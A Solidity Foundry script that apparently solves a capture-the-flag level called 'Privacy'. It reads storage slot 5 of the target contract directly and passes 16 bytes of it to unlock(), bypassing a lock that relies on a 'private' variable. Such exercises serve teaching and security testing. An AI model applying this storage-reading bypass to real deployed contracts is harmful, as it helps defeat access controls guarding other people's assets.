// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import {Privacy} from "../src/Privacy.sol";

contract SolvePrivacy is Script {
    Privacy public privacy;
    bytes32 data;

    function setUp() public {}

    function run() public {
        privacy = Privacy((vm.envAddress("PRIVACY_ADDRESS")));
        data = vm.load(address(privacy), bytes32(uint256(5)));
        vm.startBroadcast();
        privacy.unlock(bytes16(data));
        vm.stopBroadcast();
    }
}
